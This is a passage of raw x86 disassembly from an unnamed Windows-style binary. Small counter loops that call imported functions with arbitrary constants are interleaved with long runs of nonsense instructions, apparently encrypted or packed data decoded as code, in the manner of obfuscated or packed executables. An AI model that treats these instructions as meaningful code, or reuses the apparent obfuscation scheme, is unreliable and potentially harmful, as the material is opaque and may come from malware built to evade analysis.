  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x43035f,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x4302b5,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x430357,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x430357
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x430357,ecx
  406b87:	cmp    DWORD PTR ds:0x430357,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x430357,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e666
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42e927
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e648
  406bcd:	add    DWORD PTR ds:0x4302bd,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42ec4b
  406bdf:	and    edi,DWORD PTR ds:0x430363
  406be5:	mov    DWORD PTR ds:0x42ec4b,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x19d77504
  406bfe:	pop    edi
  406bff:	fisub  DWORD PTR [ebp+0x3a]
  406c02:	jle    0x406c82
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406c3d
  406c09:	xor    DWORD PTR [eax],eax
  406c0b:	pop    edx
  406c0c:	dec    esi
  406c0d:	mov    al,ds:0x6d819a66
  406c12:	fisubr WORD PTR [ebp+0xb98f577]
  406c18:	and    bl,bh
  406c1a:	jl     0x406bd2
  406c1c:	mov    ecx,0x5a3b2ab8
  406c21:	inc    edx
  406c22:	in     eax,dx
  406c23:	mov    cl,ah
  406c25:	emms   
  406c27:	scas   al,BYTE PTR es:[edi]
  406c28:	in     al,0xfa
  406c2a:	rcl    DWORD PTR [ebx+0x5],0x54
  406c2e:	jb     0x406bb9
  406c30:	pop    ds
  406c31:	lods   eax,DWORD PTR ds:[esi]
  406c32:	jg     0x406c73
  406c34:	cmc    
  406c35:	dec    edx
  406c36:	add    esi,DWORD PTR [edx]
  406c38:	inc    edi
  406c39:	adc    BYTE PTR [edi-0x52],bh
  406c3c:	stc    
  406c3d:	inc    ecx
  406c3e:	sub    ebp,edi
  406c40:	out    0x98,al
  406c42:	repz adc eax,0x393ca9a4
  406c48:	dec    eax
  406c49:	mov    ebp,0x5a49756
  406c4e:	mov    edx,0xe5ce4208
  406c53:	sbb    edi,ebx
  406c55:	sub    DWORD PTR [ebp-0x12a22737],esp
  406c5b:	pop    es
  406c5c:	xchg   edx,eax
  406c5d:	addr16 adc dl,ch
  406c60:	add    ecx,DWORD PTR [eax]
  406c62:	in     eax,0x3f
  406c64:	ins    BYTE PTR es:[edi],dx
  406c65:	(bad)  
  406c66:	jmp    0x4184:0x4d1a477e
  406c6d:	lods   eax,DWORD PTR ds:[esi]
  406c6e:	adc    eax,0x39ead76e
  406c73:	mov    dh,0x81
  406c75:	sub    esp,DWORD PTR [ecx]
  406c77:	aad    0x38
  406c79:	sbb    ch,BYTE PTR [edi]
  406c7b:	xchg   edi,eax
  406c7c:	das    
  406c7d:	mov    ch,0x6
  406c7f:	test   edi,esi
  406c81:	(bad)  
  406c82:	push   ebp
  406c83:	repz xor cl,BYTE PTR ds:0x7e815491
  406c8a:	std    
  406c8b:	jns    0x406caa
  406c8d:	xchg   ebp,eax
  406c8e:	icebp  
  406c8f:	mov    al,0x41
  406c91:	leave  
  406c92:	jnp    0x406d08
  406c94:	mov    dh,0x87
  406c96:	test   bl,al
  406c98:	fcmovu st,st(5)
  406c9a:	stos   DWORD PTR es:[edi],eax
  406c9b:	imul   ecx,DWORD PTR [ebx-0x67],0x45e0be4
  406ca2:	inc    edi
  406ca3:	sub    BYTE PTR [esi+0x7a],0xf2
  406ca7:	cs fcomp st(2)
  406caa:	aaa    
  406cab:	ins    BYTE PTR es:[edi],dx
  406cac:	ds xor al,0xb2
  406caf:	fsub   st(3),st
  406cb1:	sbb    eax,0x8ad206e9
  406cb6:	push   eax
  406cb7:	pop    edi
  406cb8:	cmp    BYTE PTR [ecx+edx*8+0x58],bl
  406cbc:	add    BYTE PTR [ecx-0x4d2960ea],ah
  406cc2:	xor    DWORD PTR [edx-0x51],esp
  406cc5:	jb     0x406cbd
  406cc7:	mov    bl,BYTE PTR [eax+edi*2]
  406cca:	stc    
  406ccb:	imul   ebp,DWORD PTR [esi-0x2ef33183],0x1d8b7787
  406cd5:	or     ebx,DWORD PTR ds:0x181d5594
  406cdb:	and    BYTE PTR [ebx],al
  406cdd:	mov    ch,0x17
  406cdf:	cdq    
  406ce0:	pop    ds
  406ce1:	in     al,0x2d
  406ce3:	or     edi,DWORD PTR [edx]
  406ce5:	out    dx,al
  406ce6:	fcomp  QWORD PTR [edi-0x37]
  406ce9:	sbb    eax,0xbf315179
  406cee:	nop
  406cef:	mov    esi,0xd6e0ff3
  406cf4:	lock jb 0x406d23
  406cf7:	shl    DWORD PTR [ecx],1
  406cf9:	xor    DWORD PTR [edx],esp
  406cfb:	xchg   esi,eax
  406cfc:	sbb    bh,BYTE PTR [edi+0x48]
  406cff:	out    0xf,al
  406d01:	mov    edx,0xf1293c1e
  406d06:	sub    al,0x97
  406d08:	adc    al,0x75
  406d0a:	lea    ebx,[ecx-0x46]
  406d0d:	jle    0x406cf7
  406d0f:	(bad)  
  406d10:	mov    cl,0xd5
  406d12:	jbe    0x406caa
  406d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d15:	(bad)  
  406d16:	das    
  406d17:	cdq    
  406d18:	sbb    dl,BYTE PTR [esp+edi*8+0x3dc5999b]
  406d1f:	pop    edi
  406d20:	je     0x406d73
  406d22:	scas   eax,DWORD PTR es:[edi]
  406d23:	push   ebx
  406d24:	sub    eax,0x4f3aa753
  406d29:	add    ebx,esi
  406d2b:	hlt    
  406d2c:	add    ebx,DWORD PTR [ebp-0x1b]
  406d2f:	dec    ebx
  406d30:	adc    dh,BYTE PTR [edi]
  406d32:	xchg   DWORD PTR [ebx],eax
  406d34:	mov    WORD PTR [ecx],ss
  406d36:	mov    dl,0xb9
  406d38:	and    al,0xdc
  406d3a:	cmp    ebp,ecx
  406d3c:	push   esp
  406d3d:	jge    0x406cc4
  406d3f:	popa   
  406d40:	cmp    DWORD PTR [edi],0xd4b68d3f
  406d46:	adc    BYTE PTR [eax+0x1a],0x58
  406d4a:	ja     0x406d70
  406d4c:	mov    WORD PTR [ebx+edi*2+0x2],?
  406d50:	pushf  
  406d51:	jge    0x406d5a
  406d53:	gs out dx,eax
  406d55:	or     eax,0x4254bb9c
  406d5a:	jg     0x406cf7
  406d5c:	aam    0x4f
  406d5e:	or     DWORD PTR [ebp-0x4892fe4b],eax
  406d64:	lea    ebx,[ebp-0x6b3e646]
  406d6a:	sbb    DWORD PTR ds:0x9bd53b56,ecx
  406d70:	cli    
  406d71:	or     al,0xe
  406d73:	fldcw  WORD PTR [edx+0x7695cfdd]
  406d79:	cli    
  406d7a:	(bad)  
  406d7b:	hlt    
  406d7c:	mov    bh,0xed
  406d7e:	in     al,0x9d
  406d80:	ss daa 
  406d82:	fimul  WORD PTR [esi+0x5de41bcd]
  406d88:	pop    ss
  406d89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d8a:	mov    ebp,0x3185f557
  406d8f:	pop    edx
  406d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d91:	sti    
  406d92:	mov    ebx,0x16c44bdc
  406d97:	push   ds
  406d98:	push   edx
  406d99:	push   es
  406d9a:	pop    ebp
  406d9b:	mov    edi,0x2581d103
  406da0:	pop    edi
  406da1:	add    eax,DWORD PTR [ebx+0x0]
  406da4:	add    BYTE PTR [eax],al
  406da6:	add    BYTE PTR [eax],al
  406da8:	mov    edi,DWORD PTR ds:0x43035f
  406dae:	inc    edi
  406daf:	mov    DWORD PTR ds:0x43035f,edi
  406db5:	cmp    DWORD PTR ds:0x43035f,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42eaa3
  406dcb:	cmp    DWORD PTR ds:0x43035f,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x43035f
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x43035f,edi
  406de7:	cmp    DWORD PTR ds:0x43035f,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e640,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx-0x4e477b7b],si
  406e0c:	mov    ds:0x38f13681,al
  406e11:	jle    0x406e91
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406d98
  406e18:	and    edi,ebx
  406e1a:	fs push esi
  406e1c:	sub    BYTE PTR [ecx-0x9aa2036],0xe3
  406e23:	stos   DWORD PTR es:[edi],eax
  406e24:	or     eax,0xa5810ef7
  406e29:	shl    DWORD PTR cs:[ebp-0x11aada17],1
  406e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e31:	fld    QWORD PTR [eax+0xc]
  406e34:	push   ds
  406e35:	lock mov DWORD PTR [eax-0x17f86ef6],esp
  406e3c:	cld    
  406e3d:	pop    ss
  406e3e:	outs   dx,DWORD PTR ds:[esi]
  406e3f:	leave  
  406e40:	and    bl,BYTE PTR [esi+0x75]
  406e43:	dec    ebx
  406e44:	cli    
  406e45:	int3   
  406e46:	mov    ?,WORD PTR [edi-0x3d]
  406e49:	sub    eax,0x3382e6e0
  406e4e:	and    eax,0xf06d11cf
  406e53:	xor    al,0x9d
  406e55:	push   cs
  406e56:	mov    edx,0xcc19bb4
  406e5b:	jbe    0x406e08
  406e5d:	mov    esp,0xcab2a87d
  406e62:	cld    
  406e63:	hlt    
  406e64:	and    DWORD PTR [edx-0x4c],esi
  406e67:	sub    eax,0x3409c3dc
  406e6c:	je     0x406e60
  406e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e6f:	leave  
  406e70:	sbb    eax,ebp
  406e72:	jo     0x406e06
  406e74:	ss out dx,eax
  406e76:	into   
  406e77:	clc    
  406e78:	mov    cl,0xba
  406e7a:	cmp    eax,0x2cf67b19
  406e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e80:	clc    
  406e81:	sbb    dh,BYTE PTR [esp+edx*8+0x39]
  406e85:	adc    BYTE PTR [ebp+0x6e],0x8d
  406e89:	jecxz  0x406e24
  406e8b:	shl    DWORD PTR [edi+0x16d371cd],cl
  406e91:	mov    ah,0x3a
  406e93:	fiadd  DWORD PTR [edi+0x31e0998d]
  406e99:	mov    ds:0x7de57cfd,al
  406e9e:	call   0xd3fa:0x3eabea4f
  406ea5:	add    eax,0xa23ef22c
  406eaa:	jl     0x406ee9
  406eac:	dec    ebx
  406ead:	or     eax,0x89a1c1d3
  406eb2:	xchg   ecx,eax
  406eb3:	push   ecx
  406eb4:	iret   
  406eb5:	and    ch,BYTE PTR [eax-0xa706002]
  406ebb:	test   BYTE PTR [edx],0xb6
  406ebe:	adc    DWORD PTR [ecx+0x4aab6647],esp
  406ec4:	(bad)  
  406ec5:	sbb    DWORD PTR [esp+ecx*4+0x50],edi
  406ec9:	(bad)  
  406eca:	mov    ss,ebx
  406ecc:	and    al,0x12
  406ece:	cdq    
  406ecf:	mov    bh,0x83
  406ed1:	xchg   esp,eax
  406ed2:	shr    DWORD PTR [edi-0x279ff48c],cl
  406ed8:	fdiv   DWORD PTR [ebp+0x49ad6804]
  406ede:	push   es
  406edf:	push   eax
  406ee0:	cdq    
  406ee1:	in     eax,0x31
  406ee3:	mov    ds:0x113bba70,al
  406ee8:	sub    eax,0xba9abd6
  406eed:	xor    cl,BYTE PTR es:[esi-0x5a]
  406ef1:	out    0xeb,eax
  406ef3:	out    dx,eax
  406ef4:	(bad)  
  406ef6:	stos   DWORD PTR es:[edi],eax
  406ef7:	ret    0xefe0
  406efa:	jl     0x406ed6
  406efc:	xor    ch,BYTE PTR [ebx]
  406efe:	fisub  WORD PTR [ebx]
  406f00:	test   DWORD PTR [eax-0x1c1bd138],edi
  406f06:	cmp    BYTE PTR [ebx+eax*4],ch
  406f09:	bound  esi,QWORD PTR [ebx]
  406f0b:	sub    eax,0xa62fc69b
  406f10:	jp     0x406f31
  406f12:	ss jle 0x406eba
  406f15:	retf   
  406f16:	jae    0x406f19
  406f18:	jb     0x406ed6
  406f1a:	adc    eax,0xace319ad
  406f1f:	test   DWORD PTR ds:0x47398dd8,ebp
  406f25:	mov    fs,WORD PTR [esi+0x1f4b6d8c]
  406f2b:	and    eax,0x2a338523
  406f30:	xchg   ecx,eax
  406f31:	in     al,dx
  406f32:	xor    al,0x95
  406f34:	sbb    al,0xa4
  406f36:	xlat   BYTE PTR ds:[ebx]
  406f37:	xor    BYTE PTR [edi+0x66],0xbe
  406f3b:	in     al,dx
  406f3c:	inc    ecx
  406f3d:	and    al,0x13
  406f3f:	fidivr WORD PTR [esi]
  406f41:	push   0xffffffff
  406f43:	pop    ss
  406f44:	lods   al,BYTE PTR ds:[esi]
  406f45:	fidiv  DWORD PTR [esi+esi*1-0x5729cb4b]
  406f4c:	arpl   WORD PTR [edx+eax*8-0x72],si
  406f50:	out    dx,al
  406f51:	sub    BYTE PTR [edi+0x9],dh
  406f54:	dec    esi
  406f55:	or     ah,cl
  406f57:	retf   
  406f58:	and    al,0xb1
  406f5a:	in     al,0xea
  406f5c:	dec    eax
  406f5d:	jl     0x406f3e
  406f5f:	mov    ebx,esp
  406f61:	jmp    0x927799ee
  406f66:	or     al,0x11
  406f68:	fdiv   QWORD PTR [edx-0x4bf8a10d]
  406f6e:	call   FWORD PTR [esi]
  406f70:	jb     0x406f24
  406f72:	push   0xffffffde
  406f74:	repz scas eax,DWORD PTR es:[edi]
  406f76:	jmp    0x406f83
  406f78:	lea    esp,ds:0x68643a46
  406f7e:	xchg   ebx,eax
  406f7f:	jp     0x406fbf
  406f81:	mov    bh,0x35
  406f83:	test   BYTE PTR [esi+0x2b],ah
  406f86:	cld    
  406f87:	fld    QWORD PTR [ebp+0x6ba95c03]
  406f8d:	ins    DWORD PTR es:[edi],dx
  406f8e:	jg     0x406f67
  406f90:	fistp  WORD PTR [ebx-0x3d5bd0b0]
  406f96:	int    0x94
  406f98:	mov    esp,0x8e18c7dd
  406f9d:	sub    eax,DWORD PTR [ebx+0xa]
  406fa0:	ins    BYTE PTR es:[edi],dx
  406fa1:	rcl    BYTE PTR [edx+0x2ba4e6ed],0x2
  406fa8:	aad    0xeb
  406faa:	mov    al,ds:0x8bf85589
  406faf:	push   ebp
  406fb0:	or     BYTE PTR [ebx],dh
  406fb2:	cmp    eax,0x4302e5
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x4302c5,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x63e13d82,edx
  406fd4:	fild   QWORD PTR [ebx]
  406fd6:	or     eax,0x8a7e7ec6
  406fdb:	jg     0x40705b
  406fdd:	jle    0x407038
  406fdf:	mov    ch,0x83
  406fe1:	xchg   esp,eax
  406fe2:	sbb    eax,0xd67baa6f
  406fe7:	popa   
  406fe8:	pop    eax
  406fe9:	cmp    eax,0x13880c24
  406fee:	and    edi,esi
  406ff0:	mov    cl,0xca
  406ff2:	mov    eax,0x409faa1
  406ff7:	ret    0x1da0
  406ffa:	loopne 0x406f98
  406ffc:	or     edx,DWORD PTR [esi-0x11ef366]
  407002:	scas   eax,DWORD PTR es:[edi]
  407003:	jnp    0x407036
  407005:	pop    ss
  407006:	mov    ch,0xa0
  407008:	(bad)  
  407009:	seto   BYTE PTR [edi]
  40700c:	int3   
  40700d:	push   0x77df4608
  407012:	jbe    0x406f9f
  407014:	mov    ebx,0x7d3c0962
  407019:	mov    bl,0x4e
  40701b:	xor    al,0xb7
  40701d:	cwde   
  40701e:	lods   al,BYTE PTR ds:[esi]
  40701f:	pop    es
  407020:	aad    0x30
  407022:	aam    0xa8
  407024:	popf   
  407025:	cmp    al,0x92
  407027:	sub    cl,al
  407029:	sbb    eax,0x70e5f1a9
  40702e:	or     ebx,ebp
  407030:	(bad)  
  407031:	repz xchg ecx,eax
  407033:	ret    
  407034:	into   
  407035:	std    
  407036:	jns    0x40703c
  407038:	adc    eax,0x799f701f
  40703d:	mov    dh,0x1a
  40703f:	pop    esi
  407040:	mov    BYTE PTR [edx-0x76],al
  407043:	rol    DWORD PTR [ebx+0x4a],0xcc
  407047:	sub    eax,0x2c7ee41f
  40704c:	(bad)  
  40704d:	es mov bh,0xb2
  407050:	dec    edi
  407051:	jo     0x40704e
  407053:	sti    
  407054:	mov    ebp,0x2511aa6a
  407059:	in     eax,0x25
  40705b:	pop    eax
  40705c:	imul   eax,DWORD PTR [esi+0x49],0xa8def413
  407063:	push   edi
  407064:	xor    BYTE PTR [ecx+ecx*8],dl
  407067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407068:	sti    
  407069:	imul   ebx,esi,0x99243c5c
  40706f:	pop    esp
  407070:	fmul   QWORD PTR [esi-0x6834b9ce]
  407076:	mov    ah,0x4c
  407078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407079:	xchg   ebp,eax
  40707a:	call   0x9aba:0xfaeb55a2
  407081:	jmp    0x4a8f:0x6da23baa
  407088:	outs   dx,BYTE PTR ds:[esi]
  407089:	gs cld 
  40708b:	inc    esp
  40708c:	xor    al,0xf7
  40708e:	les    eax,FWORD PTR [ebx]
  407090:	jg     0x407076
  407092:	jns    0x4070d4
  407094:	(bad)
  407098:	sbb    al,0xf6
  40709a:	mov    DWORD PTR [eax+ebp*2-0x31],ebx
  40709e:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070a0:	fisttp WORD PTR [ebx]
  4070a2:	adc    bh,BYTE PTR [esi-0x729a9daa]
  4070a8:	mov    ch,BYTE PTR [esi-0x76cd5172]
  4070ae:	jmp    0x42dd52b0
  4070b3:	(bad)  
  4070b4:	mov    bl,0xee
  4070b6:	dec    esp
  4070b7:	js     0x407039
  4070b9:	aaa    
  4070ba:	or     al,0xea
  4070bc:	loop   0x40709e
  4070be:	sar    dh,cl
  4070c0:	xchg   edi,eax
  4070c1:	jmp    FWORD PTR [esp+esi*1-0xa]
  4070c5:	ror    DWORD PTR [edx+0x34f36df7],1
  4070cb:	push   cs
  4070cc:	lea    ebp,[ebp-0x12ff0973]
  4070d2:	inc    eax
  4070d3:	sti    
  4070d4:	xlat   BYTE PTR ds:[ebx]
  4070d5:	mov    al,ds:0x303ead0b
  4070da:	dec    esi
  4070db:	loopne 0x4070d1
  4070dd:	fwait
  4070de:	xchg   ebp,eax
  4070df:	pop    ebp
  4070e0:	les    esi,FWORD PTR ds:0xe825013
  4070e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e7:	sub    eax,0xce5d78ae
  4070ec:	mov    DWORD PTR [ebp-0x9],eax
  4070ef:	in     eax,dx
  4070f0:	out    dx,eax
  4070f1:	push   cs
  4070f2:	cwde   
  4070f3:	xchg   ebp,eax
  4070f4:	imul   esi,DWORD PTR [edi-0x1ea813ba],0xd9e0288f
  4070fe:	dec    ecx
  4070ff:	gs pushf 
  407101:	sub    BYTE PTR [eax-0x7f],0xab
  407105:	outs   dx,DWORD PTR ds:[esi]
  407106:	sub    al,0x22
  407108:	ss jp  0x4070cb
  40710b:	fadd   QWORD PTR [ebp-0x10]
  40710e:	or     eax,0x14f87cfd
  407113:	out    dx,eax
  407114:	lahf   
  407115:	out    0xc3,al
  407117:	jmp    0x91ecd898
  40711c:	mov    dh,0x6
  40711e:	dec    eax
  40711f:	(bad)  
  407120:	cmc    
  407121:	add    eax,0xc64a4702
  407126:	dec    ebx
  407127:	pop    esi
  407128:	push   eax
  407129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40712a:	inc    eax
  40712b:	xor    DWORD PTR [eax],ecx
  40712d:	and    DWORD PTR [ebx],esp
  40712f:	retf   0x1f78
  407132:	fisttp QWORD PTR cs:[edx+eax*4-0x74]
  407137:	xlat   BYTE PTR ds:[ebx]
  407138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407139:	cwde   
  40713a:	mov    BYTE PTR [edx+0x908dbb9],dh
  407140:	sbb    dl,dh
  407142:	inc    edx
  407143:	pop    ebx
  407144:	jne    0x40712e
  407146:	shl    DWORD PTR [eax+0xe],0xf0
  40714a:	ja     0x407198
  40714c:	dec    edi
  40714d:	push   esp
  40714e:	in     eax,dx
  40714f:	mov    edi,0x9c98e4b2
  407154:	arpl   WORD PTR [esi+0x3],di
  407157:	leave  
  407158:	ret    
  407159:	loope  0x4071b9
  40715b:	cld    
  40715c:	in     al,0xc3
  40715e:	ret    
  40715f:	adc    esi,DWORD PTR ds:0x310a662
  407165:	jecxz  0x4071ad
  407167:	or     eax,0xa119f040
  40716c:	lds    edi,FWORD PTR gs:[ebp-0x76715fc3]
  407173:	push   ebp
  407174:	or     al,0x81
  407176:	and    eax,0x42e640
  40717b:	add    BYTE PTR [eax],al
  40717d:	add    BYTE PTR [eax],al
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e640
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e640,edi
  407191:	cmp    DWORD PTR ds:0x42e640,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e640,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42e92b
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x4302e9,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x4302cd
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x4302e1,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x4302e1
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x4302e1,edi
  4071fa:	cmp    DWORD PTR ds:0x4302e1,0x6
  407201:	jne    0x407247
  407207:	push   0x42e7a9
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42e92f
  407247:	cmp    DWORD PTR ds:0x4302e1,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x4302e1
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x4302e1,edi
  407261:	cmp    DWORD PTR ds:0x4302e1,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e63c
  40728e:	or     DWORD PTR ds:0x4302e5,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0x90923f15
  4072a7:	cdq    
  4072a8:	hlt    
  4072a9:	cdq    
  4072aa:	(bad)  
  4072ab:	jle    0x40732b
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x407267
  4072b2:	sbb    bl,BYTE PTR [ecx]
  4072b4:	adc    BYTE PTR [ebx+edi*2],dh
  4072b7:	xchg   esp,eax
  4072b8:	loopne 0x40732f
  4072ba:	lea    ebx,[edx-0x418f073a]
  4072c0:	push   cs
  4072c1:	stc    
  4072c2:	clc    
  4072c3:	das    
  4072c4:	shl    DWORD PTR [esi],0x9
  4072c7:	mov    DWORD PTR [esi],ecx
  4072c9:	dec    esp
  4072ca:	repz push DWORD PTR [ecx+0x5e]
  4072ce:	sbb    eax,0x8dded2eb
  4072d3:	xor    BYTE PTR [esi+0x46],cl
  4072d6:	cmp    al,0x48
  4072d8:	add    eax,0x9425e914
  4072dd:	ror    ecx,cl
  4072df:	imul   ecx,DWORD PTR [esp+edi*8],0xd3b9e4e0
  4072e6:	rol    BYTE PTR [ebx-0x46],0x50
  4072ea:	mov    ds:0x292119b6,al
  4072ef:	mov    esp,0x7bc43e5c
  4072f4:	fs push esi
  4072f6:	mov    al,BYTE PTR [edi-0x53]
  4072f9:	aad    0x0
  4072fb:	mov    edi,DWORD PTR [esi-0x124a0861]
  407301:	shl    DWORD PTR [ebp-0x44b11c56],0xc5
  407308:	test   al,0x44
  40730a:	cmp    BYTE PTR [edx+0x1793d2ce],cl
  407310:	push   ebx
  407311:	les    esi,FWORD PTR [ebx]
  407313:	mov    ds:0xbd07b5fd,eax
  407318:	stc    
  407319:	fsubr  DWORD PTR [edi+eiz*1]
  40731c:	in     eax,0x9e
  40731e:	xchg   ebx,eax
  40731f:	aas    
  407320:	pop    esp
  407321:	rol    al,0xc2
  407324:	mov    bh,0x90
  407326:	imul   ecx,DWORD PTR [edi-0x24],0x9d3a2772
  40732d:	jne    0x40733a
  40732f:	sub    eax,0x77315a8b
  407334:	cs nop
  407336:	add    dh,bh
  407338:	int    0x27
  40733a:	and    esp,DWORD PTR [esi+0x344e0b7a]
  407340:	pop    ss
  407341:	cmp    esi,DWORD PTR [edx+ebx*4]
  407344:	aas    
  407345:	fisttp QWORD PTR [edx+0x35]
  407348:	add    bl,ch
  40734a:	xchg   edi,eax
  40734b:	mov    ch,0x65
  40734d:	lea    ebx,[edx]
  40734f:	cld    
  407350:	in     eax,dx
  407351:	ret    
  407352:	mov    bh,0xb9
  407354:	and    BYTE PTR [edi+0x74320742],cl
  40735a:	cmc    
  40735b:	jl     0x4072f3
  40735d:	lea    esi,[edx-0x2a]
  407360:	push   ds
  407361:	scas   al,BYTE PTR es:[edi]
  407362:	push   eax
  407363:	shl    DWORD PTR [esi-0x49bc3319],0x36
  40736a:	(bad)  
  40736b:	adc    eax,0xe2450681
  407370:	retf   
  407371:	pop    es
  407372:	stos   DWORD PTR es:[edi],eax
  407373:	sti    
  407374:	pop    edx
  407375:	fprem1 
  407377:	push   ss
  407378:	fadd   QWORD PTR [ecx]
  40737a:	call   0x22ed5db
  40737f:	sub    DWORD PTR ds:0x839d3d31,esi
  407385:	jmp    0x4073c5
  407387:	mov    cs,WORD PTR ds:0xf4e5a9be
  40738d:	into   
  40738e:	or     BYTE PTR [esi],ch
  407390:	(bad)  [ecx+0x7e91fbe3]
  407396:	pushf  
  407397:	scas   eax,DWORD PTR es:[edi]
  407398:	ret    0x98ee
  40739b:	repnz xor eax,0x4d97cb7c
  4073a1:	xor    ebp,eax
  4073a3:	jmp    0xf148:0x87be2088
  4073aa:	cli    
  4073ab:	mov    dl,0xd7
  4073ad:	retf   0x2c98
  4073b0:	mov    eax,0xa1bbaa81
  4073b5:	pop    esp
  4073b6:	pop    ebx
  4073b7:	jmp    eax
  4073b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073ba:	cli    
  4073bb:	jmp    0x407411
  4073bd:	lea    ecx,[esi+0xbe78d73]
  4073c3:	pusha  
  4073c4:	push   0x11
  4073c6:	icebp  
  4073c7:	dec    esi
  4073c8:	cmp    bl,BYTE PTR [ecx+0x22]
  4073cb:	outs   dx,BYTE PTR ds:[esi]
  4073cc:	cli    
  4073cd:	cdq    
  4073ce:	scas   eax,DWORD PTR es:[edi]
  4073cf:	stos   DWORD PTR es:[edi],eax
  4073d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d1:	push   cs
  4073d2:	ja     0x4073aa
  4073d4:	dec    esp
  4073d5:	fmulp  st(1),st
  4073d7:	pop    ebp
  4073d8:	shl    DWORD PTR [eax+0x31],1
  4073db:	inc    ebx
  4073dc:	test   BYTE PTR [ebx+0x2d],bh
  4073df:	or     BYTE PTR [edx+eax*4],dh
  4073e2:	imul   ecx,DWORD PTR [ebx],0xffffffa7
  4073e5:	or     bl,BYTE PTR [eax+0x2898743a]
  4073eb:	call   0x57f23437
  4073f0:	sub    eax,0xbcfd34d6
